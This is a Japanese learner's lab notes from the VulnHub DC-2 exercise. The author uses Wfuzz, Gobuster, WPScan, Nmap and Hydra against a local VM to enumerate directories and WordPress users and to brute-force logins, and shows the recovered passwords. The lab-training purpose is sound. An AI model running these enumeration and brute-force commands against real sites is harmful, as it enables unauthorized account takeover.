1. <攻略>ではディレクトリーやファイルを列挙するためにGobusterを用いましたが，代わりにWfuzzを用いて同様のことを実現してください．
   
    * 参考にしたサイト
   
    https://arakoki70.com/?p=8433

    Pyenvを用いた仮想環境内で実行する
     * 仮想環境の有効化
        ```
        >source pyvenv/bin/activate
        ```
     * 仮想環境の無効化
        ```
        >deactivate
        ```
    * URLの探索
        ```
        > wfuzz -u "探索対象のURL" -w "ワードリスト" --hc "表示しないhttpレスポンスコード"
        > wfuzz -u $URL/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,405
        ```
        ワードリストを挿入する場所をuオプション内のFUZZで指定する<br>
        --hcはhide codeの略．コンマで複数のhttpレスポンスコードを列挙できる

    * 出力
        ```
            (pyvenv) ┌─[yugo@parrot]─[~/volnhub/dc2]
            └──╼ $wfuzz -u $URL/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,405
            ********************************************************
            * Wfuzz 3.1.0 - The Web Fuzzer                         *
            ********************************************************

            Target: http://192.168.56.106:80/FUZZ
            Total requests: 4614

            =====================================================================
            ID           Response   Lines    Word       Chars       Payload                                                                                                                      
            =====================================================================

            000000001:   200        306 L    3902 W     53562 Ch    "http://192.168.56.106:80/"                                                                                                  
            000002021:   200        306 L    3902 W     53562 Ch    "index.php"                                                                                                                  
            000004501:   301        9 L      28 W       322 Ch      "wp-includes"                                                                                                                
            000004495:   301        9 L      28 W       321 Ch      "wp-content"                                                                                                                 
            000004485:   301        9 L      28 W       319 Ch      "wp-admin"                                                                                                                   

            Total time: 5.155174
            Processed Requests: 4614
            Filtered Requests: 4609
            Requests/sec.: 895.0230

        ```
    * Gobusterとの比較
  
      コマンド 　
        ```
        sudo gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt
        ```
      出力
        ```
        ===============================================================
            Gobuster v3.6
            by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
            ===============================================================
            [+] Url:                     http://192.168.56.106:80
            [+] Method:                  GET
            [+] Threads:                 10
            [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
            [+] Negative Status codes:   404
            [+] User Agent:              gobuster/3.6
            [+] Timeout:                 10s
            ===============================================================
            Starting gobuster in directory enumeration mode
            ===============================================================
            /.hta                 (Status: 403) [Size: 293]
            /.htaccess            (Status: 403) [Size: 298]
            /.htpasswd            (Status: 403) [Size: 298]
            /index.php            (Status: 200) [Size: 53562]
            /server-status        (Status: 403) [Size: 302]
            /wp-admin             (Status: 301) [Size: 319] [--> http://192.168.56.106/wp-admin/]
            /wp-content           (Status: 301) [Size: 321] [--> http://192.168.56.106/wp-content/]
            /wp-includes          (Status: 301) [Size: 322] [--> http://192.168.56.106/wp-includes/]
            Progress: 4614 / 4615 (99.98%)
            /xmlrpc.php           (Status: 405) [Size: 42]
            ===============================================================
            Finished
            ===============================================================
        ```

        表示されている中身は2つとも同じ

        WFuzzは表示する項目やワードリストを挿入する場所を細かく指定できる．

        GoBusterの方がリダイレクト先も示してくれるから親切

2. WordPressに対してユーザー列挙する際にWPScanを利用してください

    WPScanはRubyGemsで利用できるRubyで実装されたWordPress脆弱性スキャンツール

   * 参考にしたサイト
  
        https://github.com/wpscanteam/wpscan#install
        https://tech.akat.info/?p=3397

    もともとParrotOSにはRubyGenmsがインストールされていたので公式githubに従ってインストールした

   * コマンド
        ```
        sudo wpscan --url http://dc-2/ --random-user-agent --enumerate u
        ```
        --random-user-agentオプションはそのままランダムにuser-agentを使用するらしいがなぜそれが必要なのかは不明

        --enumrate uオプションでユーザ名を探索させる
   * 出力
        ```
        ┌─[yugo@parrot]─[~/volnhub/dc2]
        └──╼ $sudo wpscan --url http://dc-2/ --random-user-agent --enumerate u
        _______________________________________________________________
                __          _______   _____
                \ \        / /  __ \ / ____|
                \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
                \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                    \  /\  /  | |     ____) | (__| (_| | | | |
                    \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                WordPress Security Scanner by the WPScan Team
                                Version 3.8.27
            Sponsored by Automattic - https://automattic.com/
            @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
        _______________________________________________________________

        [+] URL: http://dc-2/ [192.168.56.106]
        [+] Started: Sun Nov 17 14:17:16 2024

        Interesting Finding(s):

        [+] Headers

        ~~中略~~

        [+] Enumerating Users (via Passive and Aggressive Methods)
        Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

        [i] User(s) Identified:

        [+] admin
        | Found By: Rss Generator (Passive Detection)
        | Confirmed By:
        |  Wp Json Api (Aggressive Detection)
        |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
        |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
        |  Login Error Messages (Aggressive Detection)

        [+] jerry
        | Found By: Wp Json Api (Aggressive Detection)
        |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
        | Confirmed By:
        |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
        |  Login Error Messages (Aggressive Detection)

        [+] tom
        | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
        | Confirmed By: Login Error Messages (Aggressive Detection)

        [!] No WPScan API Token given, as a result vulnerability data has not been output.
        [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

        [+] Finished: Sun Nov 17 14:17:19 2024
        [+] Requests Done: 58
        [+] Cached Requests: 6
        [+] Data Sent: 16.64 KB
        [+] Data Received: 514.805 KB
        [+] Memory used: 173.965 MB
        [+] Elapsed time: 00:00:02

        ```
        これで"admin"，"jerry"，"tom"が判明する

   * NSE(Nmap Scripting Engine)を使用した場合
        ```
        └──╼ $nmap --script http-wordpress-users $IP
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 14:23 JST
        Nmap scan report for dc-2 (192.168.56.106)
        Host is up (0.0046s latency).
        Not shown: 999 filtered tcp ports (no-response)
        PORT   STATE SERVICE
        80/tcp open  http
        | http-wordpress-users: 
        | Username found: admin
        | Username found: tom
        | Username found: jerry
        |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'

        Nmap done: 1 IP address (1 host up) scanned in 6.02 seconds

        ```
3. <攻略>ではWordPressダッシュボードの認証を突破するためにHydraを用いました．HydraでHTTPフォームの認証を解析しようとするとコマンドが長くなるため，代わりにWPScanを用いてください

    * 参考にしたサイト
  
        https://tech.akat.info/?p=3397
    * コマンド
        ```
        >sudo wpscan --url http://dc-2/ --random-user-agent --usernames users.txt --passwords cewl.txt
        ```
        --usernamesオプションでユーザ名が列挙されたファイルを指定(-Uオプションで個別のユーザの指定もできる)

        --passwordsオプションでパスワード候補が列挙されたファイルを指定

    * 出力
        ```
        └──╼ $sudo wpscan --url http://dc-2/ --random-user-agent --usernames users.txt --passwords cewl.txt 
        _______________________________________________________________
                __          _______   _____
                \ \        / /  __ \ / ____|
                \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
                \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                    \  /\  /  | |     ____) | (__| (_| | | | |
                    \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                WordPress Security Scanner by the WPScan Team
                                Version 3.8.27
            Sponsored by Automattic - https://automattic.com/
            @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
        _______________________________________________________________

        [+] URL: http://dc-2/ [192.168.56.106]
        [+] Started: Sun Nov 17 14:41:01 2024

        Interesting Finding(s):

        [+] Headers

        ~~中略~~

        [+] Performing password attack on Xmlrpc against 3 user/s
        Error: No response from remote server. WAF/IPS? (Failure when receiving data from the peer)                                                                                                   
        [SUCCESS] - jerry / adipiscing                                                                                                                                                                
        [SUCCESS] - tom / parturient                                                                                                                                                                  
        Trying admin / log Time: 00:00:31 <===================================================================                                                    > (646 / 1121) 57.62%  ETA: ??:??:??

        [!] Valid Combinations Found:
        | Username: jerry, Password: adipiscing
        | Username: tom, Password: parturient

        [!] No WPScan API Token given, as a result vulnerability data has not been output.
        [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

        [+] Finished: Sun Nov 17 14:41:37 2024
        [+] Requests Done: 819
        [+] Cached Requests: 5
        [+] Data Sent: 424.667 KB
        [+] Data Received: 750.678 KB
        [+] Memory used: 272.43 MB
        [+] Elapsed time: 00:00:35
        ```
        tomとjerryのパスワードが明らかになった
    
    * Hydraを使用した場合
        ```
        hydra -L users.txt -P cewl.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
        ```
        wpscanはWordPressに最適化されているからかユーザ名リストとパスワード候補リストを渡すだけで処理を始めてくれる

4. P.441の代表的なスキャンを実現するPythonプログラムを作成してください．

    自作のNMapをPythonで作成する